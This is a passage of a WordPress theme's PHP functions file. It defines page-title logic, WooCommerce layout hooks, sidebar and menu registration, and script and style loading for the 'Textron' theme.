                        $userdata      = get_userdata($GLOBALS['author']);
                        $author        = (!empty($userdata->first_name) && !empty($userdata->last_name)) ? esc_attr($userdata->first_name)." ".esc_attr($userdata->last_name) : $userdata->user_login;
                        $etp_title     = sprintf($author_text, $author);
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id != "inherit") {
                            $title_section_id = $blog_title_id;
                        }
                    }elseif ( is_search()) {
                        $etp_title     = $search_text;
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id != "inherit") {
                            $title_section_id = $blog_title_id;
                        }
                    }elseif ( is_tax() ) {
                        $etp_title     = single_cat_title('', false);
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id != "inherit") {
                            $title_section_id = $blog_title_id;
                        }
                    }elseif ( is_singular('post') ) {
                        $etp_title     = $blog_title_text;
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id_single != "inherit") {
                            $title_section_id = $blog_title_id_single;
                        }
                    }

                /*  CPT
                -------------------*/

                    elseif (!is_search()  && !is_404()) {

                        $post_info = get_post(get_the_ID());

                        if (!is_wp_error($post_info)) {

                            $post_type   = $post_info->post_type;

                            if ($post_type != 'post' && $post_type != 'page') {
                                switch ($post_type) {
                                    case 'project':
                                        $etp_title     = $project_title_text;
                                        $etp_subtitle  = $project_subtitle_text;
                                        if ($project_title_id != "inherit") {
                                            $title_section_id = $project_title_id;
                                        }
                                        break;
                                    case 'product':
                                        $etp_title     = $product_title_text;
                                        $etp_subtitle  = $product_subtitle_text;
                                        if ($product_title_id != "inherit") {
                                            $title_section_id = $product_title_id;
                                        }
                                        break;
                                    default :
                                        $etp_title     = ucfirst(get_post_type( get_the_ID() ));
                                        $etp_subtitle  = '';
                                        if ($blog_title_id != "inherit") {
                                            $title_section_id = $blog_title_id;
                                        }
                                        break;
                                }

                                if ( is_tax() ) {
                                    $etp_title = single_cat_title('', false);
                                }
                            }

                        }

                    }

                    if ( is_singular('project') ) {
                        $etp_title     = $project_title_text;
                        $etp_subtitle  = $project_subtitle_text;
                        if ($project_title_id_single != "inherit") {
                            $title_section_id = $project_title_id_single;
                        }
                    }

                    if ( is_singular('product') ) {
                        $etp_title     = $product_title_text;
                        $etp_subtitle  = $product_subtitle_text;
                        if ($product_title_id_single != "inherit") {
                            $title_section_id = $product_title_id_single;
                        }
                    }

                if (is_404()) {
                    $title_section_id = "none";
                }
            ?>

            <?php if(shortcode_exists("rev_slider") && $slider != "none" && !empty($slider)): ?>
                <?php echo(do_shortcode('[rev_slider '.$slider.']')); ?>
            <?php else: ?>

                <?php
                    if ($title_section_id != "none" && $title_section_id != "default" && function_exists('enovathemes_addons_title_section_html')) {
                        enovathemes_addons_title_section_html($title_section_id, $etp_title, $etp_subtitle, $etp_breadcrumbs);
                    } elseif ($title_section_id == "default") {
                        textron_enovathemes_default_title_section($etp_title, $etp_subtitle, $etp_breadcrumbs);
                    }

                ?>

            <?php endif ?>

        <?php }
        add_action('textron_enovathemes_title_section', 'textron_enovathemes_title_section');

    /* Move top
    ---------------*/

        function textron_enovathemes_move_top(){ ?>
            <?php global $textron_enovathemes; ?>
            <?php if ((isset($GLOBALS['textron_enovathemes']['mtt']) && $GLOBALS['textron_enovathemes']['mtt'] == 1)): ?>
                <a id="to-top" href="#wrap"><?php echo textron_enovathemes_svg_icon('arrow.svg'); ?></a>
            <?php endif ?>
        <?php }
        add_action('textron_enovathemes_move_top', 'textron_enovathemes_move_top');

        function textron_enovathemes_custom_cursor(){ ?>
            <?php
                global $textron_enovathemes;
                $main_color = (isset($GLOBALS['textron_enovathemes']['main-color']) && $GLOBALS['textron_enovathemes']['main-color']) ? $GLOBALS['textron_enovathemes']['main-color'] : '#00bfff';
            ?>
            <?php if ((isset($GLOBALS['textron_enovathemes']['cursor']) && $GLOBALS['textron_enovathemes']['cursor'] == 1)): ?>
                <div class="cursor" data-color="<?php echo esc_attr($main_color); ?>"></div>
                <div class="cursor-follower"></div>
            <?php endif ?>
        <?php }
        add_action('textron_enovathemes_custom_cursor', 'textron_enovathemes_custom_cursor');

    /* Page comments
    ---------------*/

        function textron_enovathemes_page_comments(){
            if (class_exists('Woocommerce')){

                $add_comment_template = "true";

                $wishlistpage = "false";
                if (defined('YITH_WCWL')) {
                    $wishlistpage = (is_page(get_option('yith_wcwl_wishlist_page_id'))) ? "true" : "false";
                }

                if (is_cart() || is_checkout() || is_account_page() || is_wc_endpoint_url() || $wishlistpage == "true") {
                    $add_comment_template = "false";
                }

                if ($add_comment_template == "true") {
                    comments_template();
                }

            } else {

                $add_comment_template = "true";

                if ($add_comment_template == "true" &&  comments_open( get_the_ID() )) {
                    comments_template();
                }

            }
        }
        add_action('textron_enovathemes_after_page_body', 'textron_enovathemes_page_comments');

    /* Page container after/before
    ---------------*/

        function textron_enovathemes_woocommerce_page_container_before(){
            if (class_exists('Woocommerce')){

                $wishlistpage = "false";
                if (defined('YITH_WCWL')) {
                    $wishlistpage = (is_page(get_option('yith_wcwl_wishlist_page_id'))) ? "true" : "false";
                }

                if (is_cart() || is_checkout() || is_account_page() || is_wc_endpoint_url() || $wishlistpage == "true") {
                    echo '<div class="product-layout product-container-boxed">';
                }

            }
        }
        add_action('textron_enovathemes_before_page_container', 'textron_enovathemes_woocommerce_page_container_before');


        function textron_enovathemes_woocommerce_page_container_after(){
            if (class_exists('Woocommerce')){

                $wishlistpage = "false";
                if (defined('YITH_WCWL')) {
                    $wishlistpage = (is_page(get_option('yith_wcwl_wishlist_page_id'))) ? "true" : "false";
                }

                if (is_cart() || is_checkout() || is_account_page() || is_wc_endpoint_url() || $wishlistpage == "true") {
                    echo '</div>';
                }

            }
        }
        add_action('textron_enovathemes_after_page_container', 'textron_enovathemes_woocommerce_page_container_after');

/* Menu
---------------*/

    function textron_enovathemes_register_menu() {

        register_nav_menus(
            array(
              'header-menu' => esc_html__( 'Header menu', 'textron' ),
            )
        );

    }
    add_action( 'after_setup_theme', 'textron_enovathemes_register_menu' );

/* Widget areas
---------------*/

    add_action( 'widgets_init', 'textron_enovathemes_register_sidebars' );
    function textron_enovathemes_register_sidebars() {

        if ( function_exists( 'register_sidebar' ) ){

            global $textron_enovathemes;

            register_sidebar(
                array (
                'name'          => esc_html__( 'Blog widgets', 'textron'),
                'id'            => 'blog-widgets',
                'description'   => esc_html__('Add your blog widgets here. This is the main blog widget area. It is visible only in blog archive pages.', 'textron'),
                'class'         => 'blog-widgets',
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget'  => '</div>',
                'before_title'  => '<h5 class="widget_title">',
                'after_title'   => '</h5>' )
            );

            register_sidebar(
                array (
                'name'          => esc_html__( 'Blog single post page widgets', 'textron'),
                'id'            => 'blog-single-widgets',
                'description'   => esc_html__('Add your blog single post widgets here. This widget area is only visible in the single post page.', 'textron'),
                'class'         => 'blog-single-widgets',
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget'  => '</div>',
                'before_title'  => '<h5 class="widget_title">',
                'after_title'   => '</h5>' )
            );

            if (class_exists("Woocommerce")) {

                register_sidebar(
                    array (
                    'name'          => esc_html__( 'Shop widgets', 'textron'),
                    'id'            => 'shop-widgets',
                    'description'   => esc_html__('Add your shop widgets here. This widget area is visible in shop arhive pages only.', 'textron'),
                    'class'         => 'shop-widgets',
                    'before_widget' => '<div id="%1$s" class="widget %2$s">',
                    'after_widget'  => '</div>',
                    'before_title'  => '<h5 class="widget_title">',
                    'after_title'   => '</h5>' )
                );

                register_sidebar(
                    array (
                    'name'          => esc_html__( 'Shop single post page widgets', 'textron'),
                    'id'            => 'shop-single-widgets',
                    'description'   => esc_html__('Add your shop single product widgets here. This widget area is only visible in single product page.', 'textron'),
                    'class'         => 'shop-single-widgets',
                    'before_widget' => '<div id="%1$s" class="widget %2$s">',
                    'after_widget'  => '</div>',
                    'before_title'  => '<h5 class="widget_title">',
                    'after_title'   => '</h5>' )
                );

            }
        }
    }

/* Woo Commerce
---------------*/

    if (class_exists('Woocommerce')){

        /* Show mini cart on cart and checkout
        ---------------*/

            add_filter( 'woocommerce_widget_cart_is_hidden', 'textron_enovathemes_always_show_cart', 40, 0 );
            function textron_enovathemes_always_show_cart() {
                return false;
            }

        /* Remove default styling
        ---------------*/

            add_filter( 'woocommerce_enqueue_styles', '__return_empty_array' );

        /* Woocommerce gallery sypport
        ---------------*/

            add_action( 'after_setup_theme', 'textron_enovathemes_setup' );
            function textron_enovathemes_setup() {
                add_theme_support( 'wc-product-gallery-zoom' );
                add_theme_support( 'wc-product-gallery-lightbox' );
                add_theme_support( 'wc-product-gallery-slider' );
            }

        /* Add to cart
        ---------------*/

            add_filter('woocommerce_add_to_cart_fragments', 'textron_enovathemes_add_to_cart');
            function textron_enovathemes_add_to_cart( $fragments ) {

                global $woocommerce;

                ob_start(); ?>

                <?php if ($GLOBALS['woocommerce']->cart->cart_contents_count): ?>
                    <span class="cart-contents"><?php echo esc_attr($GLOBALS['woocommerce']->cart->cart_contents_count); ?></span>
                <?php else: ?>
                    <span class="cart-contents"></span>
                <?php endif; ?>

                <?php

                $fragments['span.cart-contents'] = ob_get_clean();
                return $fragments;

            }

        /* Shop loop
        ---------------*/

            remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10 );
            remove_action( 'woocommerce_before_main_content', 'woocommerce_breadcrumb', 20 );
            remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10 );
            remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 20 );
            remove_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30 );

            /* Shop title
            ---------------*/

                add_filter( 'woocommerce_show_page_title' , 'textron_enovathemes_woo_hide_page_title' );
                function textron_enovathemes_woo_hide_page_title() {
                    return false;
                }

            /* Shop filter
            ---------------*/

                add_action( 'woocommerce_before_shop_loop', 'textron_enovathemes_before_shop_loop_open', 15 );
                function textron_enovathemes_before_shop_loop_open() {?>

                    <div class="woocommerce-before-shop-loop et-clearfix">
                    <?php

                        add_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 20 );
                        add_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30 );
                }

                add_action( 'woocommerce_before_shop_loop', 'textron_enovathemes_before_shop_loop_close', 40 );
                function textron_enovathemes_before_shop_loop_close() {?>

                    </div>

                <?php }

            /* Shop loop item
            ---------------*/

                remove_action( 'woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', 10 );
                remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', 5 );

                add_action( 'woocommerce_before_shop_loop_item', 'textron_enovathemes_loop_product_inner_open', 10 );
                function textron_enovathemes_loop_product_inner_open() { ?>

                    <div class="post-inner et-item-inner et-clearfix">

                        <?php if(get_option( 'woocommerce_enable_ajax_add_to_cart' ) === "yes"){ ?>
                            <div class="ajax-add-to-cart-loading">
                                <svg viewBox="0 0 56 56"><circle class="loader-path" cx="28" cy="28" r="20" /></svg>
                                <?php echo textron_enovathemes_svg_icon('tick.svg'); ?>
                            </div>
                        <?php } ?>

                <?php }

                    remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', 10 );
                    remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_thumbnail', 10 );

                    add_action( 'woocommerce_before_shop_loop_item_title', 'textron_enovathemes_loop_product_thumbnail', 10 );
                    function textron_enovathemes_loop_product_thumbnail() { ?>

                        <?php
                            global $post, $product, $textron_enovathemes;

                            $product_image_full   = (isset($GLOBALS['textron_enovathemes']['product-image-full']) && $GLOBALS['textron_enovathemes']['product-image-full'] == 1) ? "true" : "false";

                            $product_id = $product->get_id();
                            $thumb_size = ($product_image_full == "true") ? 'full': 'shop_catalog';

                            $image_class = array();
                            $image_class[] = 'post-image';
                            $image_class[] = 'post-media';
                            $image_class[] = 'overlay-hover';

                        ?>

                        <div class="<?php echo implode(' ', $image_class); ?>">

                            <a href="<?php the_permalink(); ?>" >

                                <?php if ( $product->is_on_sale() ) : ?>
                                    <?php echo apply_filters( 'woocommerce_sale_flash', '<span class="onsale">' . esc_html__( 'Sale!', 'textron' ) . '</span>', $post, $product ); ?>
                                <?php endif;?>

                                <div class="image-container">
                                    <?php echo textron_enovathemes_build_post_media('list',$thumb_size,false); ?>
                                </div>
                            </a>

                        </div>

                    <?php }

                    remove_action( 'woocommerce_shop_loop_item_title', 'woocommerce_template_loop_product_title', 10 );

                    add_action( 'woocommerce_shop_loop_item_title', 'textron_enovathemes_loop_product_title', 10 );
                    function textron_enovathemes_loop_product_title() { ?>
                        <div class="post-body et-clearfix">
                            <div class="post-body-inner">
                                <h4 class="post-title et-clearfix">
                                    <a href="<?php the_permalink(); ?>" title="<?php echo esc_attr__("Read more avbout", 'textron').' '.the_title_attribute( 'echo=0' ); ?>"><?php the_title(); ?></a>
                                </h4>
                    <?php }

                add_action( 'woocommerce_after_shop_loop_item', 'textron_enovathemes_loop_product_inner_close', 20 );
                function textron_enovathemes_loop_product_inner_close() { ?>
                            </div>
                        </div>
                    </div>
                <?php }


            /* Shop navigation
            ---------------*/

                add_action('init','textron_enovathemes_woocommerce_pagination');
                function textron_enovathemes_woocommerce_pagination(){

                    global $textron_enovathemes;

                    $product_navigation = (isset($GLOBALS['textron_enovathemes']['product-navigation']) && $GLOBALS['textron_enovathemes']['product-navigation']) ? $GLOBALS['textron_enovathemes']['product-navigation'] : "pagination";
                    if ($product_navigation == 'loadmore' || $product_navigation == 'scroll') {
                        remove_action( 'woocommerce_after_shop_loop', 'woocommerce_pagination', 10 );
                        add_action( 'woocommerce_after_shop_loop', 'textron_enovathemes_woocommerce_pagination', 10 );
                        function textron_enovathemes_woocommerce_pagination() {

                            global $textron_enovathemes;

                            $product_navigation = (isset($GLOBALS['textron_enovathemes']['product-navigation']) && $GLOBALS['textron_enovathemes']['product-navigation']) ? $GLOBALS['textron_enovathemes']['product-navigation'] : "pagination";

                            if (function_exists('enovathemes_addons_ajax_nav')) {
                                echo enovathemes_addons_ajax_nav($product_navigation,'product');
                            } else {
                                echo textron_enovathemes_post_nav_num('product');
                            }
                        }

                    }

                }

        /* Category
        ---------------*/

            function textron_enovathemes_category_class( $classes, $class, $category= null ){
                $classes[] = 'et-item post';
                return $classes;
            }
            add_filter( 'product_cat_class', 'textron_enovathemes_category_class', 10, 3 );

            remove_action( 'woocommerce_before_subcategory', 'woocommerce_template_loop_category_link_open', 10);
            remove_action( 'woocommerce_after_subcategory', 'woocommerce_template_loop_category_link_close', 10);

            remove_action( 'woocommerce_shop_loop_subcategory_title', 'woocommerce_template_loop_category_title', 10);
            add_action( 'woocommerce_shop_loop_subcategory_title', 'woocommerce_template_loop_category_title', 10);
            if ( ! function_exists( 'woocommerce_template_loop_category_title' ) ) {
                function woocommerce_template_loop_category_title( $category ) { ?>
                    <h4 class="woocommerce-loop-category__title post-title post-title">
                        <a href="<?php echo esc_url(get_term_link( $category->slug, 'product_cat' )); ?>" title="<?php echo esc_attr__("View ", 'textron').' '.esc_attr( $category->name ); ?>">
                        <?php
                            echo esc_attr($category->name);
                            if ( $category->count > 0 ){
                                echo apply_filters( 'woocommerce_subcategory_count_html', ' <mark class="count">(' . $category->count . ')</mark>', $category );
                            }
                        ?>
                        </a>
                    </h4>

                <?php }
            }

            function textron_enovathemes_before_subcategory($category){ ?>
                <div class="post-inner et-item-inner et-clearfix">

                    <?php

                        $image_class = array();
                        $image_class[] = 'post-image';
                        $image_class[] = 'post-media';
                        $image_class[] = 'overlay-hover';

                    ?>

                    <div class="<?php echo implode(' ', $image_class); ?>">
                        <a href="<?php echo esc_url(get_term_link( $category->slug, 'product_cat' )); ?>" title="<?php echo esc_attr__("View ", 'textron').' '.esc_attr( $category->name ); ?>">
                            <div class="image-container">
            <?php }
            add_filter( 'woocommerce_before_subcategory', 'textron_enovathemes_before_subcategory', 10, 2);

            remove_action( 'woocommerce_before_subcategory_title', 'woocommerce_subcategory_thumbnail', 10);
            add_action( 'woocommerce_before_subcategory_title', 'textron_enovathemes_subcategory_thumbnail', 10);
            function textron_enovathemes_subcategory_thumbnail($category){

                global $textron_enovathemes;

                $product_image_full = (isset($GLOBALS['textron_enovathemes']['product-image-full']) && $GLOBALS['textron_enovathemes']['product-image-full'] == 1) ? "true" : "false";

                $thumb_size = ($product_image_full == "true") ? 'full': 'shop_catalog';

                $thumbnail_id = get_term_meta( $category->term_id, 'thumbnail_id', true  );

                if ($thumbnail_id) {
                    echo textron_enovathemes_build_post_media('list',$thumb_size,$thumbnail_id);
                } else {
                    $image = wc_placeholder_img_src();
                    if ( $image ) {
                        $image = str_replace( ' ', '%20', $image );
                        echo '<img src="' . esc_url( $image ) . '" />';
                    }
                }

            }

            add_filter( 'woocommerce_before_subcategory_title', 'textron_enovathemes_before_subcategory_title', 10, 2 );
            function textron_enovathemes_before_subcategory_title(){ ?>
                            </div>
                        </a>
                    </div>
                    <div class="post-body et-clearfix">
                        <div class="post-body-inner">
            <?php }

            add_filter( 'woocommerce_after_subcategory_title', 'textron_enovathemes_after_subcategory_title', 10, 2 );
            function textron_enovathemes_after_subcategory_title(){ ?>
                        </div>
                    </div>
            <?php }

            function textron_enovathemes_after_subcategory(){ ?>
                </div>
            <?php }
            add_filter( 'woocommerce_after_subcategory', 'textron_enovathemes_after_subcategory', 10, 2 );

        /* Single product
        ---------------*/

            add_action( 'woocommerce_before_single_product_summary', 'textron_enovathemes_single_product_wrapper_open', 5 );
            function textron_enovathemes_single_product_wrapper_open() {?>
                <div class="single-product-wrapper et-clearfix">
            <?php }

                remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10 );



                add_action( 'woocommerce_single_product_summary', 'textron_enovathemes_single_product_before_title', 2 );
                function textron_enovathemes_single_product_before_title(){ ?>
                    <div class="single-title-wrapper et-clearfix">
                <?php }

                add_action( 'woocommerce_single_product_summary', 'textron_enovathemes_single_product_after_title', 6 );
                function textron_enovathemes_single_product_after_title(){ ?>
                    </div>
                <?php }

                add_action('init', 'textron_enovathemes_single_product');
                function textron_enovathemes_single_product(){

                    global $textron_enovathemes;

                    $product_single_social  = (isset($GLOBALS['textron_enovathemes']['product-single-social']) && $GLOBALS['textron_enovathemes']['product-single-social'] == 1) ? "true" : "false";

                    if ($product_single_social == "true") {
                        add_filter( 'woocommerce_product_meta_end', 'textron_enovathemes_woocommerce_product_meta_end', 5, 2 );
                        function textron_enovathemes_woocommerce_product_meta_end(){ ?>
                            <?php echo enovathemes_addons_post_social_share('post-social-share'); ?>
                        <?php }
                    }

                }

            add_action( 'woocommerce_after_single_product_summary', 'textron_enovathemes_single_product_wrapper_close', 5 );
            function textron_enovathemes_single_product_wrapper_close() {?>
                </div>
            <?php }

            remove_action( 'woocommerce_review_before', 'woocommerce_review_display_gravatar', 10 );
            add_action( 'woocommerce_review_before', 'textron_enovathemes_woocommerce_review_display_gravatar', 10 );
            function textron_enovathemes_woocommerce_review_display_gravatar( $comment ) {
                echo get_avatar( $comment, apply_filters( 'woocommerce_review_gravatar_size', '72' ), '' );
            }

            add_action( 'woocommerce_after_single_product', 'textron_enovathemes_woocommerce_after_single_product');
            function textron_enovathemes_woocommerce_after_single_product() {?>
                <div class="et-clearfix">
                    <?php textron_enovathemes_post_nav('product',get_the_ID()); ?>
                </div>
            <?php }

    }

/* Scripts/Styles
---------------*/

    function textron_enovathemes_scripts_styles_general() {

        global $textron_enovathemes;

        wp_enqueue_style('textron-style', get_stylesheet_uri() );
        wp_enqueue_style( 'textron-default-fonts', textron_enovathemes_fonts_url(), array(), '1.0.0' );
        wp_enqueue_style('textron-default-styles', get_template_directory_uri() . '/css/dynamic-styles-cached.css');

        if (isset($GLOBALS['textron_enovathemes']['disable-defaults']) && $GLOBALS['textron_enovathemes']['disable-defaults'] == 1) {
            wp_dequeue_style( 'textron-default-styles' );
            wp_dequeue_style( 'textron-default-fonts' );
        }

        if ( is_singular() && get_option( 'thread_comments' ) ) {
            wp_enqueue_script( 'comment-reply' );
        }

        // dequeue
        wp_dequeue_style( 'woocommerce_prettyPhoto_css' );
        wp_deregister_style( 'woocommerce_prettyPhoto_css' );

    }

    function textron_enovathemes_scripts() {

        global $textron_enovathemes,$wp_query;

        $plugins_combined = (isset($GLOBALS['textron_enovathemes']['plugins-combined']) && $GLOBALS['textron_enovathemes']['plugins-combined'] == 1) ? 'true' : 'false';
        $blog_post_layout = (isset($GLOBALS['textron_enovathemes']['blog-post-layout']) && $GLOBALS['textron_enovathemes']['blog-post-layout']) ? $GLOBALS['textron_enovathemes']['blog-post-layout'] : "masonry";

        if ($blog_post_layout) {
            wp_enqueue_script( 'imagesloaded');
            wp_enqueue_script( 'jquery-masonry');
        }

        if ($plugins_combined == "true") {
            wp_enqueue_script( 'plugins-combined', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/plugins-combined.js', array('jquery'), '', true);
        } else {
            wp_enqueue_script( 'gsap', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/gsap.min.js', array('jquery'), '', true);
            wp_enqueue_script( 'morph-sv-gplugin', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/MorphSVGPlugin.min.js', array('jquery'), '', true);
            wp_enqueue_script( 'split-text', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/SplitText.min.js', array('jquery'), '', true);
            wp_enqueue_script( 'scroll-to', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/ScrollToPlugin.min.js', array('jquery'), '', true);
            wp_enqueue_script( 'tiny-slider', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/tiny-slider.min.js', array('jquery'), '', true);
            wp_enqueue_script( 'simple-scrollbar', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/simple-scrollbar.min.js', array('jquery'), '', true);
            wp_enqueue_script( 'waypoints', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/waypoints.min.js', array('jquery'), '', true);
            wp_enqueue_script( 'cookie', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/cookie.js', array('jquery'), '', true);
            wp_enqueue_script( 'countdown', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/countdown.js', array('jquery'), '', true);
        }

        if (!is_admin()) {

            wp_enqueue_script( 'controller', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/controller.js', array('jquery'), '', true);

            $project_per_page = (isset($GLOBALS['textron_enovathemes']['project-per-page']) && !empty($GLOBALS['textron_enovathemes']['project-per-page'])) ? $GLOBALS['textron_enovathemes']['project-per-page'] : get_option( 'posts_per_page' );
            $product_per_page = (isset($GLOBALS['textron_enovathemes']['product-per-page']) && !empty($GLOBALS['textron_enovathemes']['product-per-page'])) ? $GLOBALS['textron_enovathemes']['product-per-page'] : get_option( 'posts_per_page' );
            $post_paged       = (get_query_var('page')) ? get_query_var('page') : 1;

            $post_max         = $wp_query->max_num_pages;
            $project_max      = (empty($project_per_page)) ? $wp_query->max_num_pages : ceil($wp_query->found_posts/$project_per_page);
            $product_max      = (empty($product_per_page)) ? $wp_query->max_num_pages : ceil($wp_query->found_posts/$product_per_page);

            wp_localize_script(
                'controller',
                'controller_opt',
                array(
                    'postMax'        => $post_max,
                    'projectMax'     => $project_max,
                    'productMax'     => $product_max,
                    'start'          => $post_paged,
                    'postNextLink'   => next_posts($post_max, false),
                    'projectNextLink'=> next_posts($project_max, false),
                    'projectPerPage' => $project_per_page,
                    'productNextLink'=> next_posts($product_max, false),
                    'noMore'         => esc_html__("No more", 'textron'),
                    'filterText'     => esc_html__("Choose category", 'textron'),
                    'ajaxUrl'        => admin_url('admin-ajax.php'),
                )
            );
        }

        if (is_page()) {

            $one_page = get_post_meta( get_the_ID(), 'enovathemes_addons_one_page', true );

            if ($one_page == "on") {

                $one_page_filter = (isset($GLOBALS['textron_enovathemes']['one-page-filter']) && $GLOBALS['textron_enovathemes']['one-page-filter']) ? explode(',',esc_attr($GLOBALS['textron_enovathemes']['one-page-filter'])) : '';
                $et_filter_array = array();

                if (is_array($one_page_filter)) {
                    foreach ($one_page_filter as $filter) {
                        array_push($et_filter_array, '#'.$filter.' > a');
                    }
                }

                wp_enqueue_script( 'single-page-nav', TEXTRON_ENOVATHEMES_TEMPPATH.'/js/single-page-nav.js', array('jquery'), '', true);
                wp_localize_script(
                    'single-page-nav',
                    'single_page_nav_opt',
                    array(
                        'filterArray' => (!empty($et_filter_array)) ? implode(', ', $et_filter_array) : ''
                    )
                );

            }
        }

    }

    function textron_enovathemes_admin_scripts_styles() {

        global $textron_enovathemes,$wp_query;

        wp_enqueue_style( 'wp-color-picker' );
        wp_enqueue_script( 'wp-color-picker' );
        wp_enqueue_style( 'textron-admin', TEXTRON_ENOVATHEMES_TEMPPATH . '/css/admin.css', false, '');
        wp_enqueue_script( 'textron-admin', TEXTRON_ENOVATHEMES_TEMPPATH . '/js/admin.js', array('jquery'), '', true);

        $project_per_page = (isset($GLOBALS['textron_enovathemes']['project-per-page']) && !empty($GLOBALS['textron_enovathemes']['project-per-page'])) ? $GLOBALS['textron_enovathemes']['project-per-page'] : get_option( 'posts_per_page' );
        $post_paged       = (get_query_var('page')) ? get_query_var('page') : 1;

        $project_max      = (empty($project_per_page)) ? $wp_query->max_num_pages : ceil($wp_query->found_posts/$project_per_page);

        wp_localize_script(
            'textron-admin',
            'admin_opt',
            array(
                'projectMax'     => $project_max,
                'start'          => $post_paged,
                'projectNextLink'=> next_posts($project_max, false),
                'projectPerPage' => $project_per_page,
                'noMore'         => esc_html__("No more", 'textron'),
                'filterText'     => esc_html__("Choose category", 'textron'),
                'ajaxUrl'        => admin_url('admin-ajax.php'),
            )
        );

        return;
    }

    add_action( 'wp_enqueue_scripts', 'textron_enovathemes_scripts_styles_general');
    add_action( 'wp_enqueue_scripts', 'textron_enovathemes_scripts');

    add_action('admin_enqueue_scripts','textron_enovathemes_scripts');
    add_action('admin_enqueue_scripts','textron_enovathemes_admin_scripts_styles');

    function textron_enovathemes_editor_styles() {
        wp_enqueue_style('textron-default-fonts', '//fonts.googleapis.com/css?family=Nunito+Sans:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i' );
        wp_enqueue_style( 'textron-editor-style', TEXTRON_ENOVATHEMES_TEMPPATH . '/css/editor-style.css' );

    }
    add_action( 'enqueue_block_editor_assets', 'textron_enovathemes_editor_styles' );


?>
